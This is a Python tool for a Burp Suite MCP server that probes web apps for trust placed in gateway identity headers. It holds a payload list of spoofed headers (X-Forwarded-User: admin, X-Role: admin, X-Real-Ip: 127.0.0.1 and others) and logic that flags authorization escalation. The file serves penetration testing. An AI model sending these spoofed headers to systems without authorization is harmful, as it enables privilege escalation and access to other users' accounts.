"""probe_internal_headers — edge-vs-internal trust split via injected identity headers.

Apps fronted by a load balancer / API gateway often trust headers like
`X-User-Id`, `X-Role`, `X-Forwarded-User` set by the gateway and forwarded
to internal services. If the edge does not strip operator-supplied versions
of those headers, an attacker can pivot to any user/role.

Distinct from host_header: this targets identity / authz headers, not host /
URL rewriting.

Strix-derived. Pure black-box.
"""

from mcp.server.fastmcp import FastMCP

from burpsuite_mcp import client


_HEADERS_AND_VALUES = [
    # (header, pivot value, intent)
    ("X-User-Id", "1", "first-user enumeration"),
    ("X-User-Id", "0", "system-user pivot"),
    ("X-Authenticated-User", "admin", "name-based admin pivot"),
    ("X-Forwarded-User", "admin", "gateway-trusted user spoof"),
    ("X-Remote-User", "admin", "apache mod_auth header spoof"),
    ("X-Webauth-User", "admin", "shibboleth/SSO header spoof"),
    ("X-Auth-User", "admin", "generic SSO header spoof"),
    ("X-Auth-Username", "admin", "generic SSO header spoof"),
    ("X-Forwarded-Roles", "admin,superuser", "role pivot via gateway claim"),
    ("X-User-Roles", "admin", "role pivot"),
    ("X-Role", "admin", "role pivot"),
    ("X-User-Group", "admins", "group pivot"),
    ("X-User-Tenant", "0", "tenant pivot to root tenant"),
    ("X-Tenant-Id", "0", "tenant pivot to root tenant"),
    ("X-Account-Id", "1", "account pivot"),
    ("X-Original-Url", "/admin", "rewrite-trusted internal admin route"),
    ("X-Rewrite-Url", "/admin", "Symfony/Spring rewrite spoof"),
    ("X-Real-Ip", "127.0.0.1", "internal-IP trust"),
    ("X-Internal-Request", "true", "internal-flag trust"),
    ("X-Forwarded-Internal", "true", "gateway-internal flag"),
    ("X-Cluster-Client-Ip", "127.0.0.1", "k8s internal-IP trust"),
    ("X-Server-Internal", "1", "internal-marker trust"),
    ("X-Service-Token", "internal", "service-mesh token spoof"),
]


def register(mcp: FastMCP):

    @mcp.tool()
    async def probe_internal_headers(
        session: str,
        path: str,
        method: str = "GET",
        body: str = "",
        pivot_value: str = "",
    ) -> str:
        """Inject identity headers to detect edge-vs-internal trust split.

        Args:
            session: Auth session (use an unprivileged user for max signal).
            path: Endpoint path (target a 403/401 admin path for best signal).
            method: HTTP method.
            body: Optional raw body for POST/PUT.
            pivot_value: Optional override for the pivot value (defaults to per-header sensible values).
        """
        baseline = await client.post("/api/session/request", json={
            "session": session, "method": method, "path": path,
            "headers": {"Content-Type": "application/json"} if body else {},
            "body": body,
        })
        if "error" in baseline:
            return f"Error getting baseline: {baseline['error']}"
        b_status = baseline.get("status", 0)
        b_body = baseline.get("response_body", "")
        b_len = len(b_body)

        lines = [
            f"probe_internal_headers {method} {path}",
            f"Baseline (unprivileged session, no headers): status={b_status} len={b_len}",
            "",
        ]
        findings = []
        flagged_strong = []

        for header, value, intent in _HEADERS_AND_VALUES:
            v = pivot_value or value
            resp = await client.post("/api/session/request", json={
                "session": session, "method": method, "path": path,
                "headers": {header: v, **({"Content-Type": "application/json"} if body else {})},
                "body": body,
            })
            if "error" in resp:
                lines.append(f"  {header}={v} -> error")
                continue
            s = resp.get("status", 0)
            rbody = resp.get("response_body", "")
            ln = len(rbody)

            flags = []
            # Authorization escalation: baseline was 401/403 but pivot is now 2xx
            if b_status in (401, 403, 404) and 200 <= s < 300:
                flags.append("AUTHZ_ESCALATION")
            # Status flip in any direction
            elif s != b_status:
                flags.append(f"STATUS:{s}")
            # Body delta >25%
            elif b_len > 0 and abs(ln - b_len) / b_len > 0.25:
                flags.append(f"LEN_DELTA:{ln}/{b_len}")
            # Reflection of pivot value in response body
            elif v.lower() in rbody.lower() and v.lower() not in b_body.lower():
                flags.append("REFLECTED")

            flag_str = " ".join(f"[!{f}]" for f in flags) if flags else "[OK]"
            lines.append(f"  {header}={v} ({intent}): status={s} len={ln} {flag_str}")

            if flags:
                strong = "AUTHZ_ESCALATION" in flags
                findings.append((header, v, flags, intent, strong))
                if strong:
                    flagged_strong.append((header, v, intent))

        lines.append("\n--- Summary ---")
        if findings:
            lines.append(f"Anomalies: {len(findings)} / {len(_HEADERS_AND_VALUES)}")
            if flagged_strong:
                lines.append("\nCRITICAL — direct authorization escalation candidates:")
                for h, v, intent in flagged_strong:
                    lines.append(f"  [!!] {h}={v} ({intent})")
                lines.append("Verify with a clean baseline + chain into a privileged action.")
            else:
                lines.append("\nWeaker signals only (status/length/reflection). Worth manual review but not direct AuthZ bypass.")
        else:
            lines.append("No internal-header trust split detected.")
        return "\n".join(lines)
